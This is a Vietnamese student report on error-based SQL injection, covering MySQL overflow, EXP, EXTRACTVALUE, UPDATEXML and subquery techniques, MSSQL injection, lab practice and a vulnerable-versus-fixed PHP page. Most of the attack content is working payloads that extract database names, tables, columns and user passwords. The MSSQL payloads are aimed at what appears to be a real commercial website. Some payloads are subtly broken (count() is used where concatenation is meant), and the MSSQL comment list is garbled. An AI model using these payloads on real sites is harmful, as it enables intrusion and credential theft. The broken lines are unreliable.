 # <div align="center"><p> Error-base-sql-injection </p></div>
 ## Họ và tên: Mai Thị Hoàng Yến
 ## Ngày báo cáo: Ngày 25/4/2022
 ### MỤC LỤC
 1. [Tìm hiểu về error base sql injection](#gioithieu)
 
     1.1 [Khái niệm Error-based sqli ](#kn)
      
     1.2 [Khi nào cần phải sử dụng Error-based sqli](#kn1)
     
 2. [Chi tiết về lỗi sql injection](#ct1) 

     2.1 [Khai thác lỗi sqli dựa trên Numberic overflow ](#ct2)
      
     2.2 [Khai thác lỗi sqli sử dụng hàm EXP](#ct3)

     2.3 [Khai thác lỗi sqli sử dụng hàm Extractvalue ](#ct4)
      
     2.4 [Khai thác lỗi sqli sử dụng hàm UPDATEXML](#ct5)

     2.5 [Khai thác lỗi sqli sử dụng SubQuery Injection ](#ct6)
      
     2.6 [MSSQL Error Based Injection](#ct7)
       
 3. [Thực hành các lỗi sql injection](#kt0)

     3.1 [Khai thác lỗi sqli sử dụng hàm UPDATEXML](#kt1)
      
     3.2 [Khai thác lỗi sqli sử dụng hàm Extractvalue](#kt2)
     
     3.3 [Khai thác lỗi sqli sử dụng SubQuery Injection ](#kt3)
     
 4. [Mô phỏng lỗ hổng](#mp0)

     4.1 [ Mô phỏng trang web lỗi](#mp1)
      
     4.2 [ Mô phỏng trang web đã được fix](#mp2)

5. [Các hàm đã sử dụng trong web](#5)

 
### Nội dung báo cáo 
#### 1. Tìm hiểu về error base sql injection <a name="gioithieu"></a>
<br> 1.1 Khái niệm Error-based sqli<a name="kn"></a></br>
 - Là một kỹ thuật tấn công SQL Injection dựa vào thông báo lỗi được trả về từ Database Server có chứa thông tin về cấu trúc của cơ sở dữ liệu. Trong một vài trường hợp, chỉ một mình Error-based là đủ cho hacker có thể liệt kê được các thuộc tính của cơ sở dữ liệu.

<br> 1.2 Khi nào cần phải sử dụng Error-based sqli <a name="kn1"></a></br>
 - Đó là khi chúng ta không thể nhận được bất kỳ đầu ra nào bằng cách sử dụng Union base sqli và lỗi sẽ hiển thị cho chúng ta. Trong trường hợp đó, chúng ta phải sử dụng tính năng error base sqli.

#### 2. Chi tiết về lỗi sql injection <a name="ct1"></a>
<br> 2.1 Khai thác lỗi sqli dựa trên Numberic overflow <a name="ct2"></a></br>
 - MySQL hỗ trợ các kiểu dữ liệu tiêu chuẩn SQL như INTEGER, SMALLINT, TINYINT, MEDIUMINT, BIGINT. FLOAT, DOUBLE…
 - Mỗi kiểu dữ liệu sẽ có một phạm vi giới hạn khác nhau. Khi các giá trị vượt ra ngoài giới hạn này nó sẽ dẫn tới hiện tượng tràn số (overflow). Có sự khác nhau trong xử lý Out-of-range và overflow giữa các phiên bản MySQL. Việc xử lý Out-of-range và overflow từ phiên bản MySQL 5.5.5 trở lên sẽ trả về một thông báo lỗi, trong khi trong các phiên bản thấp hơn mặc định sẽ trả về một kết quả mà không đưa ra bất kỳ thông báo lỗi nào.
   - Ví dụ:
    -  kiểu dữ liệu BIGINT có kích thước 8 byte (64 bit). Giá trị số nguyên có dấu lớn nhất của nó là:

       - Binary: 0b0111111111111111111111111111111111111111111111111111111111111111
       - Hex: 0x7fffffffffffffff
       - Decimal: 9223372036854775807
  
       - MySQL 5.5.5 trở lên: Khi thực hiện phép toán với các giá trị trên (ví dụ tăng thêm 1) sẽ gây ra tràn số và trả về thông báo lỗi:
    
         ![image](https://user-images.githubusercontent.com/101852647/164913365-80432bf3-4fa3-4c45-b262-3adcc496c027.png)
      
       - Trong phiên bản MySQL thấp hơn, kết quả trả về một giá trị:
    
         ![image](https://user-images.githubusercontent.com/101852647/164141921-c915a0e2-6be1-4b04-b616-9e5f694c8c5f.png)
      
   - Đối với kiểu dữ liệu BIGINT không dấu, giá trị lớn nhất của nó là:

     - Binary: 0b1111111111111111111111111111111111111111111111111111111111111111
     - Hex: 0xFFFFFFFFFFFFFFFF
     - Decimal: 18446744073709551615
     - Kết quả cũng tương tự, hiện tượng tràn số xảy ra trong các phiên bản MySQL 5.5.5 trở lên:
    
       ![image](https://user-images.githubusercontent.com/101852647/164142773-bd83384f-ef54-4d74-9a56-cb23bfe184bd.png)
      
     - Với phiên bản MySQL thấp hơn:
    
       ![image](https://user-images.githubusercontent.com/101852647/164142884-5ada5eed-82ec-491b-9503-261c1a4c6b62.png)
      
 - Lợi dụng xử lý out-of-range và overflow trên các phiên bản MySQL từ 5.5.5 trở lên, ta có thể gây ra tràn số để leak dữ liệu qua các thông báo lỗi, qua đó thực hiện khai thác Error based SQL injection.
 
 - Ví dụ:
 - Lấy tên bảng:

   `!(select*from(select table_name from information_schema.tables where table_schema=database() limit 0,1)x)-~0`
   
 - Lấy tên cột:

   `select !(select*from(select column_name from information_schema.columns where table_name=’users’ limit 0,1)x)-~0;`
  
 - Lấy dữ liệu:

   `!(select*from(select concat_ws(‘:’,id, username, password) from users limit 0,1)x)-~0;`
 
 - Injection vào Insert:

     ![image](https://user-images.githubusercontent.com/101852647/164916632-8760830c-9668-4436-a02b-accc33b800a4.png)
     
     ![image](https://user-images.githubusercontent.com/101852647/164916651-a6894b72-21f0-4286-b82b-789039187461.png)
     
 - Injection vào Update:

     ![image](https://user-images.githubusercontent.com/101852647/164916658-56aa69dd-7dfc-430a-9495-327bd39f587f.png)

 - Injection vào Delete:

     ![image](https://user-images.githubusercontent.com/101852647/164916674-17aa4e1d-0d41-43b9-9ae3-575570101ea1.png)
     
<br> 2.2 Khai thác lỗi sqli sử dụng hàm EXP <a name="ct3"></a></br>
 -  Hàm exp () sẽ gây ra lỗi tràn khi vượt qua một giá trị lớn trên 709. Đây là một lỗi tràn khác trong kiểu dữ liệu DOUBLE trong MySQL.

       ![image](https://user-images.githubusercontent.com/101852647/164148420-1f95fc82-e8a5-4011-91f2-ff480e3abbf1.png)
    
 - Chúng ta có thể gây ra các lỗi `giá trị DOUBLE nằm ngoài phạm vi` bằng cách phủ định các truy vấn. Giả sử khi thực hiện phủ định bit một truy vấn, nó sẽ trả về “18446744073709551615”. Đó là do một hàm trả về 0 khi thực hiện thành công và khi chúng ta phủ định nó sẽ là giá trị BIGINT không dấu tối đa.
 
      ![image](https://user-images.githubusercontent.com/101852647/164149342-3d2eb3ab-ccc2-4fb5-9677-41f9dce7bdda.png)

 - Khi chúng ta chuyển các truy vấn có phủ định bit, điều này sẽ gây ra lỗi tràn DOUBLE và chúng ta có thể trích xuất dữ liệu.

      ![image](https://user-images.githubusercontent.com/101852647/164149550-6ac2ae5a-ac39-4574-a3e5-6db381843ae5.png)
      
 - Ví dụ:

   - Lấy tất cả các bảng và các cột:

     `http://localhost/dvwa/vulnerabilities/sqli/?id=1' or exp(~(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns         where table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x))-- -&Submit=Submit#`
  
   - Injection vào Insert:

     ![image](https://user-images.githubusercontent.com/101852647/164916251-55f650d5-7809-412e-8e6c-9fda985c37d8.png)`
     
     ![image](https://user-images.githubusercontent.com/101852647/164916257-3e7b2de7-b689-4f93-9ab8-8ba23983bca9.png)
     
   - Injection vào Update:

     ![image](https://user-images.githubusercontent.com/101852647/164916268-27fd52c0-5138-4290-be6a-3630331c9bf7.png)

   - Injection vào Delete:

     ![image](https://user-images.githubusercontent.com/101852647/164916286-a9b5ff40-b974-493f-91b2-f58118b51e3b.png)

<br> 2.3 Khai thác lỗi sqli sử dụng hàm Extractvalue <a name="ct4"></a></br>
 - Chúng ta sẽ sử dụng một trong các hàm XPATH là Extractvalue() để tạo ra lỗi và lấy đầu ra. 
 - Trong MySQL chạy một truy vấn XPath đối với một chuỗi đại diện cho dữ liệu XML. Hàm nhận đầu vào ở dạng sau:
 
   `ExtractValue ('xmldatahere', 'xpathqueryhere')`
   
 - Nếu truy vấn XPath không chính xác về mặt cú pháp, chúng ta sẽ gặp thông báo:
 
   `XPATH syntax error: 'xpathqueryhere'`
   
 - Ví dụ:
    - Lấy database hiện tại:
 
       `http://192.168.199.130/cat.php?id=-35" and extractvalue(0x0a,concat(0x0a,(select database())))--`

       `Output : XPATH syntax error: 'table_name_here'`
        
    - Lấy các bảng:

        `www.vuln-web.com/index.php?view=-35" and extractvalue(0x0a,concat(0x0a,(select table_name from information_schema.tables where                      table_schema=database() limit 0,1)))--`
        
        `Output : XPATH syntax error: 'table_name_here'`
        
    - Lấy các cột:

        `www.vuln-web.com/index.php?view=-35" and extractvalue(0x0a,concat(0x0a,(select column_name from information_schema.columns where                    table_schema=database() and table_name='users' limit 0,1)))--`
        
        `Output : XPATH syntax error: 'column_name_here'`
        
    - Lấy dữ liệu:

        `www.vuln-web.com/index.php?view=-35" and extractvalue(0x0a,concat(0x0a,(select count(username,0x3a,password) from users limit 0,1)))--`
        
        `Output : XPATH syntax error: 'Output_here'`

<br> 2.4 Khai thác lỗi sqli sử dụng hàm UPDATEXML <a name="ct5"></a></br>
 -  Chúng ta sẽ sử dụng một trong các hàm XPATH là UPDATEXML() để tạo ra lỗi và lấy đầu ra. 
 - Trong MySQL chạy một truy vấn XPath đối với một chuỗi đại diện cho dữ liệu XML. Hàm nhận đầu vào ở dạng sau:
   
   `UPDATEXML (XMLType_Instance, XPath_string, value_expression, namespace_string)`
   
 - Nếu truy vấn XPath không chính xác về mặt cú pháp, chúng ta sẽ gặp thông báo:
 
   `XPATH syntax error: 'xpathqueryhere'`
   
 - Ví dụ:
   - Lấy database hiện tại:
 
      `http://192.168.199.130/cat.php?id=-35" and updatexml(null,concat(0x3a,(0x0a,(select database()))),null)--`
    
      `Output : XPATH syntax error: ':database_name_here'`
      
   - Lấy các bảng:

      `www.vuln-web.com/index.php?view=-35" and updatexml(null,concat(0x3a,(select table_name from information_schema.tables where                        table_schema=database() limit 0,1)),null)--`
      
      `Output : XPATH syntax error: ':table_name_here'`

   - Lấy các cột:

      `www.vuln-web.com/index.php?view=-35" and updatexml(null,concat(0x3a,(select column_name from information_schema.columns where                      table_schema=database() and table_name='users' limit 0,1)),null)--`
      
      `Output : XPATH syntax error: ':column_name_here'`
      
  - Lấy dữ liệu:    

      `www.vuln-web.com/index.php?view=-35" and updatexml(null,concat(0x3a,(select count(username,0x3a,password) from users limit 0,1)),null)--`
      
      `Output : XPATH syntax error: ':Output_here'`
      
<br> 2.5 Khai thác lỗi sqli sử dụng SubQuery Injection <a name="ct6"></a></br>  

- Nó cũng tương đối giống với XPATH. Nhưng vấn đề đặt ra là tại sao chúng ta không sử dụng XPATH mà phải sử dụng cái này đó là do XPATH không có sẵn trong một số phiên bản của MySQL và có thể bị lọc hoặc khóa bởi quản trị viên, đó là lý do tại sao để khắc phục vấn đề này, chúng ta sẽ sử dụng Sub Query Injection.
- Ví dụ:
   - Bây giờ sẽ kiểm tra trang web:

     `www.vuln-web.com/photo.php?id=1/
      No Error`  
      
     `www.vuln-web.com/photo.php?id=1"
      No Error`
      
     `www.vuln-web.com/photo.php?id=1'  
      You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' 
      LIMIT 0,1' at line 1`

   - Lấy database hiện tại:
 
      `www.vuln-web.com/photo.php?id=1' and (select 1 from (Select count(*),Concat((select database()),0x3a,floor(rand(0)*2))y from information_schema.tables group by y) x)-- -`

   - Lấy các bảng:

      `www.vuln-web.com/photo.php?id=1' and (select 1 from (Select count(*),Concat((select table_name from information_schema.tables where table_schema=database() limit 0,1),0x3a,floor(rand(0)*2))y from information_schema.tables group by y) x)-- -`
      
   - Lấy cột từ bất kỳ một bảng:

     `www.vuln-web.com/photo.php?id=1' and (select 1 from (Select count(*),Concat((select column_name from information_schema.columns where table_schema=database() and table_name='<table_name_here>' limit 0,1),0x3a,floor(rand(0)*2))y from information_schema.tables group by y) x)-- -`
     
  - Lấy dữ liệu từ các cột:

     `www.vuln-web.com/photo.php?id=1' and (select 1 from (Select count(*),Concat((select concat(<column_1>,<column_2>) from <table_name_here> limit 0,1),0x3a,floor(rand(0)*2))y from information_schema.tables group by y) x)-- -`
     
<br> 2.6 MSSQL Error Based Injection <a name="ct7"></a></br>  
  - Đầu tiên chúng ta cần phải biết một vài kiểu comment của MSSQL:
    - `-`	:	Comment Loại 1
    - `- +`	:	Comment Loại 2
    - `- + -`	: SQL Comment
    - `/ ** /`	:	Inline Comment
    - `;% 00`	:	Null Byte
   
 - Ví dụ:

    - Bắt đầu comment với mục tiêu:
    
      `http://www.timescanindia.in/Product.aspx?Id=7--
       working fine.`
      
      `http://www.timescanindia.in/Product.aspx?Id=7 order by 1--
       No Error`
     
   - Lấy tên database:

     `http://www.timescanindia.in/Product.aspx?Id=7 and 1=db_name()--`

   - Lấy version:

     `http://www.timescanindia.in/Product.aspx?Id=7 and @@version=1--`

   - có thể lấy tất cả các bảng và cột:

     `http://www.timescanindia.in/Product.aspx?Id=7 and 1=(select+table_name%2b'::'%2bcolumn_name as t+from+information_schema.columns FOR XML PATH(''))--`

#### 3. Thực hành lỗi sql injection <a name="kt0"></a>
<br> 3.1 Khai thác lỗi sqli sử dụng hàm UPDATEXML <a name="kt1"></a></br>
 - Đầu tiên chúng ta sẽ lấy database bằng câu lệnh `id=1' and updatexml(null,concat(0x3a,(0x0a,(select database()))),null)--`:

    ![image](https://user-images.githubusercontent.com/101852647/164968858-163086b7-8dd3-4c48-a96c-904135f199ff.png)
 
 - Lấy các bảng trong database bằng câu lệnh `id=1' and updatexml(null,concat(0x3a,(select table_name from information_schema.tables where table_schema=database() limit 0,1)),null)-- -` :

    ![image](https://user-images.githubusercontent.com/101852647/164969307-ec7805b6-afeb-44a4-aef7-59d744746047.png)

    ![image](https://user-images.githubusercontent.com/101852647/164969359-fee5b2b7-faf5-491c-8017-ca7db9006a9f.png)
    
 - Lấy bảng tiếp theo bằng câu lệnh `id=1' and updatexml(null,concat(0x3a,(select table_name from information_schema.tables where table_schema=database() limit 1,1)),null)-- -` :

    ![image](https://user-images.githubusercontent.com/101852647/164969411-68a7aa92-1fab-414b-a68d-1e064fd885bc.png)
 
 - Lấy các cột trong bảng `users` bằng lệnh `and updatexml(null,concat(0x3a,(select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1)),null)--`. Chúng ta sẽ thay đổi `limit 0,1` từ 0->7. Như vậy chúng ta sẽ có 8 cột.

    ![image](https://user-images.githubusercontent.com/101852647/164969872-1a0038cd-538d-495d-ad95-e95d5d3cda49.png)

    ![image](https://user-images.githubusercontent.com/101852647/164969883-306e2b92-05e8-4e00-8297-220de78863df.png)
   
    ![image](https://user-images.githubusercontent.com/101852647/164969891-a004a39f-b508-48c7-a4f3-9512c56109df.png)
   
    ![image](https://user-images.githubusercontent.com/101852647/164969900-eda9e1c2-be62-4490-909d-69ce9d7c746f.png)

    ![image](https://user-images.githubusercontent.com/101852647/164969906-6e1d5a50-2ab8-44f1-96f5-470dd594322f.png)

    ![image](https://user-images.githubusercontent.com/101852647/164969912-5cd4bf70-b74b-4399-9006-67cba58999e5.png)
   
    ![image](https://user-images.githubusercontent.com/101852647/164969938-ff69f7f5-849c-4e0f-aaaf-94d0eb13aa20.png)
   
    ![image](https://user-images.githubusercontent.com/101852647/164969953-569965b7-6426-4fb0-9d13-856b1432e18e.png)
   
    ![image](https://user-images.githubusercontent.com/101852647/164969974-8b0787da-4e16-45d2-873c-9de576ad425b.png)

- Đếm xem là có bao nhiêu `user` trong bảng `users` bằng lệnh `and updatexml(null,concat(0x3a,(select count(user) from users)),null)--`:

    ![image](https://user-images.githubusercontent.com/101852647/164970233-f333de83-4604-441e-ac50-fc957513232c.png)

    ![image](https://user-images.githubusercontent.com/101852647/164970237-715c79a6-4b6c-4bf2-9c56-b2fe9cab0494.png)

- Lấy user và password bằng lệnh`and updatexml(null,concat(0x3a,(select count(user,0x3a,password) from users limit 0,1)),null)--`

    ![image](https://user-images.githubusercontent.com/101852647/165009252-bb48481f-df38-4381-9326-f0a944e8e384.png)

<br> 3.2 Khai thác lỗi sqli sử dụng hàm Extractvalue <a name="kt2"></a></br>

- Đầu tiên lấy database bằng lệnh `and extractvalue(0x0a,concat(0x0a,(select database())))--`:

    ![image](https://user-images.githubusercontent.com/101852647/164973050-4265c8a0-77f4-4250-a499-716bf90c61df.png)

    ![image](https://user-images.githubusercontent.com/101852647/164973061-730af44a-64a2-4640-878d-d812a4d715e9.png)

- Lấy các bảng trong database bằng câu lệnh `id=1' and extractvalue(0x0a,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit 0,1)))-- -` : 

    ![image](https://user-images.githubusercontent.com/101852647/164973098-1c8cbb0e-8a18-4761-a12d-32e0f74614de.png)

    ![image](https://user-images.githubusercontent.com/101852647/164973105-40931ef2-b412-4c53-ab0b-7573563c1594.png)

    ![image](https://user-images.githubusercontent.com/101852647/164973111-849e7b49-58c6-4913-bf7f-86a513cdd73e.png)
    
- Lấy các cột trong bảng `users` bằng lệnh `and extractvalue(0x0a,concat(0x0a,(select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1)))-- -`. Chúng ta sẽ thay đổi `limit 0,1` từ 0->7. Như vậy chúng ta sẽ có 8 cột.

    ![image](https://user-images.githubusercontent.com/101852647/164973142-8782c944-b5d6-4582-8a6e-6a5b2453eaee.png)
    
    ![image](https://user-images.githubusercontent.com/101852647/164973149-1de96746-d3d7-44a9-843e-ba5306b222e3.png)
    
    ![image](https://user-images.githubusercontent.com/101852647/164973154-70d16f1c-2d21-407a-a890-4b00e08047d2.png)
    
    ![image](https://user-images.githubusercontent.com/101852647/164973161-fb57c7ee-74e8-4223-9017-aa32b4e2b1a5.png)
    
    ![image](https://user-images.githubusercontent.com/101852647/164973172-f806b378-0a71-4542-a039-53c086897036.png)
    
    ![image](https://user-images.githubusercontent.com/101852647/164973176-65bc0dfa-65f9-4a86-aa24-ea11216872a7.png)
    
    ![image](https://user-images.githubusercontent.com/101852647/164973185-3746b71b-a569-48bf-b749-7ac0a6115f34.png)

    ![image](https://user-images.githubusercontent.com/101852647/164973191-9b39ac78-0b6e-4470-8a80-ba0d277bfb8c.png)

- Đếm xem là có bao nhiêu `user` trong bảng `users` bằng lệnh `and extractvalue(0x0a,concat(0x0a,(select count(username) from users)))-- -`:

    ![image](https://user-images.githubusercontent.com/101852647/164973318-392242df-bc1d-4245-8b9b-1fc4c2990eb6.png)

    ![image](https://user-images.githubusercontent.com/101852647/164973328-261d5cb5-329e-4789-8364-556fe7a1a201.png)

- Lấy user và password bằng lệnh`and extractvalue(0x0a,concat(0x0a,(select count(username,0x3a,password) from users limit 0,1)))-- -`:

    ![image](https://user-images.githubusercontent.com/101852647/165009302-93888244-e2da-4f60-b916-dbbcabdc06b6.png)

<br> 3.3 Khai thác lỗi sqli sử dụng SubQuery Injection <a name="kt3"></a></br>
- Đầu tiên lấy database bằng lệnh `1' and (select 1 from (Select count(*),Concat((select database()),0x3a,floor(rand(0)*2))y from information_schema.tables group by y) x)-- -`:

     ![image](https://user-images.githubusercontent.com/101852647/164987562-b398e661-69e2-43e3-b795-9b0d3b4ccc22.png)

     ![image](https://user-images.githubusercontent.com/101852647/164987572-4152fff4-aa4b-4394-bcb2-5166cc6a4b95.png)

- Lấy các bảng trong database bằng câu lệnh `1' and (select 1 from (Select count(*),Concat((select table_name from information_schema.tables where table_schema=database() limit 0,1),0x3a,floor(rand(0)*2))y from information_schema.tables group by y) x)-- -` : 

     ![image](https://user-images.githubusercontent.com/101852647/164987609-f5241adb-47cb-41d6-930b-ae009497010b.png)
      
     ![image](https://user-images.githubusercontent.com/101852647/164987615-2c0e8d06-0d8a-4612-8195-34c8b4fd6659.png)
      
     ![image](https://user-images.githubusercontent.com/101852647/164987626-ff132307-1278-4bef-9e63-16cf6c30a110.png)

- Lấy các cột trong bảng `users` bằng lệnh `1' and (select 1 from (Select count(*),Concat((select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1),0x3a,floor(rand(0)*2))y from information_schema.tables group by y) x)-- -`. Chúng ta sẽ thay đổi `limit 0,1` từ 0->7. Như vậy chúng ta sẽ có 8 cột.

     ![image](https://user-images.githubusercontent.com/101852647/164987657-f35b393a-b965-48de-96b2-6d30ab555037.png)
      
     ![image](https://user-images.githubusercontent.com/101852647/164987665-51256bd6-6636-48d6-af8d-de994fb785d9.png)
      
     ![image](https://user-images.githubusercontent.com/101852647/164987672-4b7e8d7f-ddf5-41b2-9b6d-d1c2cef91041.png)
      
     ![image](https://user-images.githubusercontent.com/101852647/164987676-e45e1135-c146-4695-99b9-2c0487f76a8b.png)
      
     ![image](https://user-images.githubusercontent.com/101852647/164987680-19d7ab6a-90ed-444b-a2fc-6f64dbbf96dc.png)
      
     ![image](https://user-images.githubusercontent.com/101852647/164987692-f9d899f2-994c-4777-9b68-1e72601149db.png)
      
     ![image](https://user-images.githubusercontent.com/101852647/164987699-acb83a31-2688-4308-9cd7-36a9f043a5ae.png)
      
     ![image](https://user-images.githubusercontent.com/101852647/164987706-e9736386-fa8d-4f2b-8564-24c74340909e.png)
      
     ![image](https://user-images.githubusercontent.com/101852647/164987715-a781a3df-4602-4166-996c-05b06263c180.png)

- Lấy user và password bằng lệnh`and extractvalue(0x0a,concat(0x0a,(select count(username,0x3a,password) from users limit 0,1)))-- -`:

     ![image](https://user-images.githubusercontent.com/101852647/164987813-5e9e25dd-643c-4e63-a3d7-114fd22309af.png)

     ![image](https://user-images.githubusercontent.com/101852647/164987823-93c3754a-f3c8-4870-bb61-1a30f80fbd23.png)

#### 4. Mô phỏng lỗ hổng <a name="mp0"></a>
<br> 4.1 Mô phỏng trang web lỗi <a name="mp1"></a></br>
 - Đây là code web lỗi:
 
   ![image](https://user-images.githubusercontent.com/101852647/165201192-f3422681-bfd9-4280-a055-9e29f9a764ff.png)
   
 - Tiếp theo chúng ta thử `id=1` xem có đúng là id này tồn tại trong database hay không.

   ![image](https://user-images.githubusercontent.com/101852647/165202799-78732ed0-90f4-4143-82e1-31278d02ec20.png)
   
 - Bây giờ chúng ta thử chèn `id=1'` vào xem có thông báo lỗi gì không.

   ![image](https://user-images.githubusercontent.com/101852647/165202944-e72dd606-3afd-4cc1-ab52-b9e2a73046ff.png)

 - Sau đó, chúng ta tiếp tục chèn câu lệnh `id= 1' and extractvalue(0x0a,concat(0x0a,(select database())))-- -` để xem có lấy được tên của database hay không. Như chúng ta thấy ở hình bên dưới chúng ta đã khai thác thành công lấy được tên của database. Tương tự chúng ta có thể khai thác lấy được tên bảng, tên user và password.

   ![image](https://user-images.githubusercontent.com/101852647/165203168-878ccf57-8293-4463-88aa-404f874c8d78.png)

<br> 4.2 Mô phỏng trang web đã được fix <a name="mp2"></a></br>
 - Đây chính là trang web đã được fix lỗi bằng hàm `mysqli_real_escape_string()`. Nhiệm vụ của hàm này là nó sẽ thoát các ký tự đặc biệt trong trường `id`.

   ![image](https://user-images.githubusercontent.com/101852647/165203762-2bb52710-51ae-4edd-a411-f03eb79fc1ce.png)

 - Bây giờ chúng ta nhập thử `id=1` xem thử nó có tồn tại trong database hay không.

   ![image](https://user-images.githubusercontent.com/101852647/165203963-17e98bdb-552c-48be-8bcf-17116625a1db.png)
  
 - Tiếp theo chúng ta thử nhập `id=1'` xem thử có lỗi xảy ra hay không.

   ![image](https://user-images.githubusercontent.com/101852647/165204158-6b588d97-f9d6-4891-b89e-0ef956b56533.png)
 
 - Sau đó, chúng ta sẽ thử nhập câu lệnh `id= 1' and extractvalue(0x0a,concat(0x0a,(select database())))-- -` để xem có lấy được tên của database hay không. Như chúng ta đã thấy ở hình bên dưới nó trả về lỗi chứng tỏ web chúng ta đã fix thành công.

    ![image](https://user-images.githubusercontent.com/101852647/165204266-1d888440-5a44-49ab-a736-7c2cb27a3bbf.png)

#### 5. Các hàm đã sử dụng trong web <a name="5"></a>
 
 - Hàm `mysqli_real_escape_string()`:Thoát các ký tự đặc biệt trong một chuỗi để sử dụng trong một câu lệnh SQL.
 - Hàm `mysqli_query()`: Thực hiện một truy vấn đối với cơ sở dữ liệu.
 - Hàm `mysqli_error()`: Sẽ trả về nội dung của lỗi gần nhất xảy ra khi gọi hàm nào đó từ kết nối MySQL.
 - Hàm `mysqli_fetch_assoc()`: Sẽ tìm và trả về một dòng kết quả của một truy vấn MySQL nào đó dưới dạng một mảng kết hợp.
 - Hàm `mysqli_close()`: Đóng một kết nối cơ sở dữ liệu đã mở trước đó.





